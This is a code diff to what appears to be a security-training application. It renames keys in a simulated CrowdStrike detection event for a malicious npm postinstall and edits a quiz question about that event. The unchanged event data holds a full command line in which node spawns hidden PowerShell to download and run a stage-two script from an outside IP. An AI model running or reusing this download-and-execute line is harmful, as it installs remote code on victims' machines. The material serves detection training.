@@ -34,17 +34,17 @@ const supplyChainEvent: TelemetryEvent = {
     "crowdstrike.detection.technique_id": "T1195.001",
     "crowdstrike.detection.severity": "High",
     "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-    "crowdstrike.event.FileName": "node.exe",
-    "crowdstrike.event.ProcessId": "8821",
-    "crowdstrike.event.ImageFileName": "C:\\Program Files\\nodejs\\node.exe",
-    "crowdstrike.event.CommandLine":
+    "crowdstrike.FileName": "node.exe",
+    "crowdstrike.ProcessId": "8821",
+    "crowdstrike.ImageFileName": "C:\\Program Files\\nodejs\\node.exe",
+    "crowdstrike.CommandLine":
       "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
-    "crowdstrike.event.ParentImageFileName": "npm.cmd",
-    "crowdstrike.event.ParentProcessId": "6610",
-    "crowdstrike.event.ParentCommandLine": "npm install internal-logging-utils",
-    "crowdstrike.event.UserName": "NEXACORP\\d.wong",
-    "crowdstrike.event.HostName": "LT-DEV-0212",
-    "crowdstrike.event.FileSigned": "true",
+    "crowdstrike.ParentImageFileName": "npm.cmd",
+    "crowdstrike.ParentProcessId": "6610",
+    "crowdstrike.ParentCommandLine": "npm install internal-logging-utils",
+    "crowdstrike.UserName": "NEXACORP\\d.wong",
+    "crowdstrike.HostName": "LT-DEV-0212",
+    "crowdstrike.FileSigned": "true",
     "npm.package_name": "internal-logging-utils",
     "npm.package_version": "1.0.4",
     "npm.registry": "https://registry.npmjs.org",
@@ -491,7 +491,7 @@ const edgeCaseRoom = {
       questions: [
         {
           question:
-            "The crowdstrike.event.CommandLine shows 'node -e' followed by an inline require('child_process').exec(...) call. Why is this specific pattern unusual for a package's postinstall script, even though node.exe spawning from npm is completely normal?",
+            "The crowdstrike.CommandLine shows 'node -e' followed by an inline require('child_process').exec(...) call. Why is this specific pattern unusual for a package's postinstall script, even though node.exe spawning from npm is completely normal?",
           options: [
             "It isn't unusual at all — postinstall scripts commonly use inline node -e evaluation for legitimate build steps",
             "Inline -e evaluation combined with an immediate child_process.exec call to spawn PowerShell is a pattern built for one purpose: executing an arbitrary downloaded payload, not performing a build task. Legitimate postinstall scripts are almost always separate .js files (like scripts/setup.js) that npm invokes, not raw inline code passed on the command line",
